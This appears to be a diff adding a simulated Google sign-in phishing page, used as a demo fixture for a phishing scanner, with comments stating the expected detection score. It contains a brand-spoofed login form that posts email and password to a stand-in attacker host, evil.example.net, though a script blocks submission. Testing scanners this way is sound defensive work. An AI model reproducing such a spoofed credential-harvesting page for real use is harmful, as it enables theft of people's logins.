@@ -1,0 +1,91 @@
+<!doctype html>
+<html lang="en">
+  <!-- A SIMULATED phishing page that fakes a Google sign-in. For demo only:
+       the title claims Google and the form POSTs to a foreign host. Expected
+       scanner verdict: brand_spoof 40 + cross_origin_post 35 = 75 → challenge
+       (>= 65). Footer trust links keep no_trust quiet. No card fields, so it
+       scans as a login, not a payment page. -->
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sign in - Google Accounts</title>
+    <style>
+      * { box-sizing: border-box; }
+      body { margin: 0; background: #f0f4f9; color: #202124; font-family: 'Segoe UI', system-ui, sans-serif; }
+      .demoflag {
+        background: #1d1d26; color: #ffd9a0; text-align: center; font-size: 11.5px; font-weight: 700;
+        padding: 6px 10px; letter-spacing: 0.4px;
+      }
+      main { max-width: 450px; margin: 40px auto; padding: 0 16px; }
+      .card { background: #fff; border: 1px solid #dadce0; border-radius: 18px; padding: 34px 34px 26px; }
+      .glogo { font-size: 22px; font-weight: 700; letter-spacing: -0.5px; margin-bottom: 18px; }
+      .glogo .b { color: #4285f4; } .glogo .r { color: #ea4335; }
+      .glogo .y { color: #fbbc05; } .glogo .g { color: #34a853; }
+      h1 { margin: 0 0 6px; font-size: 24px; font-weight: 400; }
+      .sub { font-size: 14px; color: #5f6368; margin-bottom: 22px; }
+      .field { margin-bottom: 16px; }
+      .field label { display: block; font-size: 12px; color: #5f6368; margin-bottom: 5px; }
+      .field input { width: 100%; border: 1px solid #dadce0; border-radius: 5px; padding: 13px 14px;
+        font: inherit; font-size: 15px; }
+      .field input:focus { outline: none; border-color: #1a73e8; }
+      .forgot { font-size: 13px; color: #1a73e8; text-decoration: none; }
+      .actions { display: flex; justify-content: space-between; align-items: center; margin-top: 20px; }
+      button { border: 1px solid #dadce0; border-radius: 5px; padding: 10px 22px; font: inherit;
+        font-weight: 600; cursor: pointer; background: #fff; color: #1a73e8; }
+      button.next { background: #1a73e8; border-color: #1a73e8; color: #fff; }
+      .fine { font-size: 11.5px; color: #5f6368; margin-top: 22px; line-height: 1.5; }
+      footer { text-align: center; font-size: 12px; color: #5f6368; margin-top: 26px; }
+      footer a { color: #5f6368; margin: 0 8px; }
+      .panel { position: fixed; inset: 0; display: none; align-items: center; justify-content: center;
+        background: rgba(32,33,36,.45); z-index: 100; }
+      .panel .box { background: #fff; border: 2px solid #202124; border-radius: 14px; padding: 24px 28px;
+        width: min(360px, 90vw); text-align: center; }
+    </style>
+  </head>
+  <body>
+    <div class="demoflag">⚠ SIMULATED PHISHING PAGE — DEMO ONLY — never a real site</div>
+
+    <main>
+      <div class="card">
+        <div class="glogo"><span class="b">G</span><span class="r">o</span><span class="y">o</span><span class="b">g</span><span class="g">l</span><span class="r">e</span></div>
+        <h1>Sign in</h1>
+        <div class="sub">Use your Google Account</div>
+
+        <form id="signinForm" action="https://evil.example.net/collect" method="POST" novalidate>
+          <div class="field">
+            <label for="em">Email or phone</label>
+            <input id="em" name="email" type="email" autocomplete="username" placeholder="you@example.com" />
+          </div>
+          <div class="field">
+            <label for="pw">Password</label>
+            <input id="pw" name="password" type="password" autocomplete="current-password" placeholder="Enter your password" />
+            <a class="forgot" href="#">Forgot password?</a>
+          </div>
+          <div class="actions">
+            <button type="button">Create account</button>
+            <button type="submit" class="next">Next</button>
+          </div>
+          <p class="fine">Not your computer? Use guest mode to sign in privately. This page is a copy made for a demo.</p>
+        </form>
+      </div>
+
+      <footer>
+        <a href="#">Privacy</a><a href="#">Terms</a><a href="#">Help</a>
+      </footer>
+    </main>
+
+    <div class="panel" id="panel">
+      <div class="box" id="panelBox"><div></div></div>
+    </div>
+
+    <script>
+      document.getElementById('signinForm').addEventListener('submit', (e) => {
+        if (e.defaultPrevented) return; // TrustPay Guard already stopped it
+        e.preventDefault();
+        const box = document.getElementById('panelBox');
+        box.innerHTML = '<div style="font-size:34px">🎣</div><div style="font-weight:800">Password captured by fake page…<br/>if this weren\u2019t a demo.</div>';
+        document.getElementById('panel').style.display = 'flex';
+      });
+    </script>
+  </body>
+</html>
